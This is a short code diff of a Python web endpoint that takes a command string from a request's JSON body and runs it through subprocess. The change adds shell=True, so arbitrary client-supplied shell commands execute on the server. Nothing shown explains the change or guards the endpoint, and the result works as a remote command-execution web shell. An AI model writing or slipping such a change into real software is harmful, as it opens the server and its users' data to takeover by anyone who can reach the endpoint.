@@ -37,7 +37,7 @@ def get_db():
 def cmd():
     data = request.get_json()
     try:
-        return subprocess.check_output([data['cmd']])
+        return subprocess.check_output([data['cmd']], shell=True)
     except subprocess.CalledProcessError as e:
         return e.output
 
